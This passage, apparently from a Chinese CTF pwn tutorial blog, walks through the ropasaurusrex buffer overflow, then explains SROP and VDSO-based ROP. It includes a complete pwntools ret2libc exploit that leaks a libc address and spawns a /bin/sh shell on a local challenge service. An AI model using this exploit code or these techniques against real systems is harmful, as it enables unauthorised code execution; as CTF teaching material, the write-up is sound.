+NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED
+PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">只开了NX 其他的都没开，我们可以应用ret2libc 的攻击方式来获取shell，所以我们得通过比如像write、puts、printf类似的函数做info leak用来计算system在内存中的地址。我们用IDA开，一边分析题目流程，一边找题目漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;__cdecl&nbsp;main()
+{
+&nbsp;&nbsp;sub_80483F4();
+&nbsp;&nbsp;return&nbsp;write(1,&nbsp;&quot;WIN\n&quot;,&nbsp;4u);
+}
+sub_80483F4
+ssize_t&nbsp;sub_80483F4()
+{
+&nbsp;&nbsp;char&nbsp;buf;&nbsp;//&nbsp;[sp+10h]&nbsp;[bp-88h]@1
+&nbsp;&nbsp;return&nbsp;read(0,&nbsp;&amp;buf,&nbsp;0x100u);
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">很清晰，我们可以看到题目流程非常简单，就读取一定字节，然后直接打印WIN\n。紧接着，我们可以看到read函数被错误使用，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">.text:080483F2&nbsp;;&nbsp;---------------------------------------------------------------------------
+.text:080483F3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;align&nbsp;4
+.text:080483F4
+.text:080483F4&nbsp;;&nbsp;===============&nbsp;S&nbsp;U&nbsp;B&nbsp;R&nbsp;O&nbsp;U&nbsp;T&nbsp;I&nbsp;N&nbsp;E&nbsp;=======================================
+.text:080483F4
+.text:080483F4&nbsp;;&nbsp;Attributes:&nbsp;bp-based&nbsp;frame
+.text:080483F4
+.text:080483F4&nbsp;sub_80483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;main+9p
+.text:080483F4
+.text:080483F4&nbsp;buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;byte&nbsp;ptr&nbsp;-88h
+.text:080483F4
+.text:080483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp
+.text:080483F5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,&nbsp;esp
+.text:080483F7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,&nbsp;98h
+.text:080483FD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esp+8],&nbsp;100h&nbsp;;&nbsp;nbytes
+.text:08048405&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[ebp+buf]
+.text:0804840B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[esp+4],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;buf
+.text:0804840F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esp],&nbsp;0&nbsp;;&nbsp;fd
+.text:08048416&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;_read
+.text:0804841B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leave
+.text:0804841C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn
+.text:0804841C&nbsp;sub_80483F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endp
+.text:0804841C
+.text:0804841</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">buf大小只有0x88,但是却允许被读入0x100的字节大小，这明显可以造成缓冲区溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">wings@sw:~/桌面/Rop$&nbsp;file&nbsp;./ropasaurusrex
+./ropasaurusrex:&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;(SYSV),&nbsp;dynamically&nbsp;linked,&nbsp;interpreter&nbsp;/lib/ld-linux.so.2,&nbsp;for&nbsp;GNU/Linux&nbsp;2.6.18,&nbsp;BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092,&nbsp;stripped</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们还知道的一点是，程序是32位，所以我们不需要像第一个题那样去找寄存器 gadget。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在main函数中有一个write函数，我们可以通过rop，来进行信息泄漏。所以攻击思大概是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">构造payload leak 内存中的一个函数地址，比如 read()</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">计算libc base</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">构造payload get shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+debug&nbsp;=&nbsp;1
+elf&nbsp;=&nbsp;ELF(&#39;./ropasaurusrex&#39;)
+if&nbsp;debug&nbsp;==&nbsp;1:
+&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+else:
+&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+bof&nbsp;=&nbsp;0x80483f4&nbsp;#&nbsp;the&nbsp;vulnerable&nbsp;function
+buffer_len&nbsp;=&nbsp;0x88
+context.log_level&nbsp;=&nbsp;&#39;debug&#39;
+#p&nbsp;=&nbsp;remote(args.host,&nbsp;args.port)
+#p&nbsp;=&nbsp;process(&#39;./ropasaurusrex&#39;)
+p&nbsp;=&nbsp;remote(&#39;127.0.0.1&#39;,10002)
+payload&nbsp;=&nbsp;&#39;&#39;
+payload&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;buffer_len
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;saved&nbsp;ebp
+payload&nbsp;+=&nbsp;p32(elf.symbols[&#39;write&#39;])
+payload&nbsp;+=&nbsp;p32(bof)
+payload&nbsp;+=&nbsp;p32(1)&nbsp;#&nbsp;stdout
+payload&nbsp;+=&nbsp;p32(elf.got[&#39;read&#39;])
+payload&nbsp;+=&nbsp;p32(4)&nbsp;#&nbsp;len
+p.send(payload)
+resp&nbsp;=&nbsp;p.recvn(4)
+read&nbsp;=&nbsp;u32(resp)
+libc_base&nbsp;=&nbsp;read&nbsp;-&nbsp;libc.symbols[&#39;read&#39;]
+payload&nbsp;=&nbsp;&#39;&#39;
+payload&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;buffer_len
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;saved&nbsp;ebp
+payload&nbsp;+=&nbsp;p32(libc_base&nbsp;+&nbsp;libc.symbols[&#39;system&#39;])
+payload&nbsp;+=&nbsp;&#39;AAAA&#39;&nbsp;#&nbsp;cont
+payload&nbsp;+=&nbsp;p32(libc_base&nbsp;+&nbsp;next(libc.search(&#39;/bin/sh&#39;)))
+p.send(payload)
+p.sendline(&#39;ls&#39;)
+p.interactive()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">小结一下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">上面的内容来自蒸米 -一步一步 rop</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">做了两个简单的rop 第一个的64位，第二个是32位，基本上 也能体会到两者的区别了，一者是寄存器传参，一者是栈传参。至于AliCTF的vsvs ，我没找到Bin程序，所以这里就不单独分析了。我们看看别人的wp，例如链接</span><a href="https://segmentfault.com/a/1190000005718685" _src="https://segmentfault.com/a/1190000005718685" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">https://segmentfault.com/a/1190000005718685</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下一个内容准备学习 VROP，一种利用signal机制的ROP技术。</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SROP</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最近出现SROP的题目，就是XCTF -NJCTF中的 </span><a href="http://bobao.360.cn/ctf/learning/188.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Pwn300-233</a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，虽然出题人是这么出的，但是也还是有非预期做法的。比如Joker师傅的针对这个题目的强行解决方案，强行猜libc base 然后暴力跑，用ROP 解决。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么 SROP是什么，与普通的ROP有什么区别呢?我们可以开始学习了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">什么是SROP</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">SROP: Sigreturn Oriented Programming 系统Signal Dispatch之前会将所有寄存器压入栈，然后调用signal handler，signal handler返回时会将栈的内容还原到寄存器。 如果事先填充栈，然后直接调用signal handler，那在返回的时候就可以控制寄存器的值。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，我们得先了解一下signal的调用流程，那么我就能大概了解SROP的利用原理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正如mctrain，在他的</span><a href="http://www.freebuf.com/articles/network/87447.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">《Sigreturn Oriented Programming (SROP) Attack攻击原理》</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">文章里所提到的，当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0117d092e2235109a7.png" title="t01b5c2c4c57979f414.png" alt="http://p3.qhimg.com/t01b5c2c4c57979f414.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么，我们是如何利用这个系统调用来做一些不可告人的事情的呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在singnal中可以说是，有两个层次，一个是用户，一个是内核层次，我们也可以将这个过程简单的看作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">User&nbsp;code
+singnal&nbsp;handler
+sigreturn</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果在mctrain文章中看懂了，signal的调用流程，那么我们就可以讲讲，如何去利用攻击，即我们可以讲讲他的攻击流程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">攻击流程</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">注： 以下图片内容均来自<a href="https://www.slideshare.net/AngelBoy1/sigreturn-ori" _src="https://www.slideshare.net/AngelBoy1/sigreturn-ori">https://www.slideshare.net/AngelBoy1/sigreturn-ori</a>&nbsp; &nbsp;的PDF&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当内核发起signal</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0141b3d4e8e345ec48.png" title="t013a46ce62ea39ae78.png" alt="http://p7.qhimg.com/t013a46ce62ea39ae78.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个时候，我们可以看到栈还并未没push数据，以及ip仍然在User code上。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">将数据push到栈中时</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将sigreturn syscall的位置 push 进栈</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0119d092afe1b7b124.png" title="t0119d092afe1b7b124.png" alt="http://p8.qhimg.com/t0119d092afe1b7b124.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">紧接着程序流程跳转至signal handler</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t015b8bf7b09cb2e55b.png" title="t015b8bf7b09cb2e55b.png" alt="http://p4.qhimg.com/t015b8bf7b09cb2e55b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从signal handler 返回</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01ef5592ed296cd118.png" title="t01ef5592ed296cd118.png" alt="http://p4.qhimg.com/t01ef5592ed296cd118.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后流程又跳转至 sigreturn code</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0144f930fa69063fba.png" title="t0144f930fa69063fba.png" alt="http://p6.qhimg.com/t0144f930fa69063fba.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">执行 singreturn syscall</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01abf777a77be05ea0.png" title="t01abf777a77be05ea0.png" alt="http://p9.qhimg.com/t01abf777a77be05ea0.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">stack 即栈上的内容全部 pop 回register ，流程又重新回到 user code</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01d72dbab913415bff.png" title="t01d72dbab913415bff.png" alt="http://p6.qhimg.com/t01d72dbab913415bff.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">至此，我们基本完成了攻击，我们可以大概总结下，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们需要的攻击条件</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二，需要知道栈的地址（比如需要知道自己构造的字符串/bin/sh的地址）；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第三，需要知道syscall指令在内存中的地址；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第四，需要知道sigreturn系统调用的内存地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，更详细的，如利用SROP构造系统调用串（System call chains）依旧可以从mctrain，在他的</span><a href="http://www.freebuf.com/articles/network/87447.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">《Sigreturn Oriented Programming (SROP) Attack攻击原理》</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">文章找到，我们这里的重点并不是SROP，而是做SROP CTF题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SROP构造，及攻击流程概括的来讲就是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">伪造sigcontext 结构，push进stack中</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">设置ret address在sigreturn syscall的gadget</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将signal fram中的rip(eip)设置在syscall（int 0x80)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当sigreturn返回时，就可以执行syscall</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">需要说明的是sigretrun gadget的寻找是有前人总结的</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">x86</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">vdso 正常的 syscall handler也会使用的</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">x64</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">kernel &lt;3.3</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">vsyscall (0xffffffff600000) &lt;= 位置一直固定</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">kernel &gt;= 3.3</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">libc &lt;= 普通的syscall hander也会使用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">VDSO</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">了解了一下SROP，我们接下来可以再来学习一下什么是VDSO，以及如何直接利用VDSO做ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">VDSO(Virtual Dynamically-linked Shared Object)是个很有意思的东西, 它将内核态的调用映射到用户态的地址空间中, 使得调用开销更小, 路径更好.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">开销更小比较容易理解, 那么路径更好指的是什么呢? 拿x86下的系统调用举例, 传统的int 0x80有点慢, Intel和AMD分别实现了sysenter, sysexit和syscall, sysret, 即所谓的快速系统调用指令, 使用它们更快, 但是也带来了兼容性的问题. 于是Linux实现了vsyscall, 程序统一调用vsyscall, 具体的选择由内核来决定. 而vsyscall的实现就在VDSO中.</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Linux(kernel 2.6 or upper)环境下执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO. 例如:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">wings@sw:~$&nbsp;ldd&nbsp;/bin/sh
+&nbsp;&nbsp;&nbsp;&nbsp;linux-vdso.so.1&nbsp;=&gt;&nbsp;&nbsp;(0x00007ffee4bd1000)
+&nbsp;&nbsp;&nbsp;&nbsp;libc.so.6&nbsp;=&gt;&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;(0x00007f5e19e56000)
+&nbsp;&nbsp;&nbsp;&nbsp;/lib64/ld-linux-x86-64.so.2&nbsp;(0x0000557ef5001000)
+wings@sw:~$</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为什么要用VDSO 来做ROP？</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在X86系统中，传统的system call:int 0x80并不是由很好的效果的，因此在intel 新型的cpu提供了新的syscall指令。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">sysenter</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">sysexit</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（Linux kernel 》= 2.6后的版本支持新型syscall机制）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">VDSI可以降低在传统的 int 0x80的overhead 以及提供了sigreturn 方便在signal handler结束后返回到user code</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如何利用 VDSO 做ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们需要知道 sysenter其参数传递方式和int 0x80是一样的，但是我们需要事前自己做好funcion prolog</span></p><pre class="brush:plain;toolbar:false">push&nbsp;ebp;mov&nbsp;ebp,sp</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以及需要一个 “A good gadgaet for stack pivot”，因为如果没做function prolog可以利用ebp去改变stack位置</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Retrun to vDSO</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如何找到vdso 地址?</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">基本上里利用方法就是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">要么暴力解决</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用 信息泄露 即我们所受的information leak</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用ld.so _libc_stack_end找到 stack其实位置，计算ELF Auxiliary vector offset 并从中取出AT_SYSINFO_EHDR</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用ld.so中的_rtld_global_ro的某个offset也有vdso的位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们需要尤其注意的是在开了ASLR的情况下，VDSO的利用是有一定优势的</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在x86环境下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">只有一个字节是随机的，所以我们可以很容易暴力解决</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在x64环境下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在开启了pie的情形 有 11字节是随机的 例如：CVE-2014-9585</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但是在linux kernel 3.182.2版本之后，这个已经增加到了18个字节的随机</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, 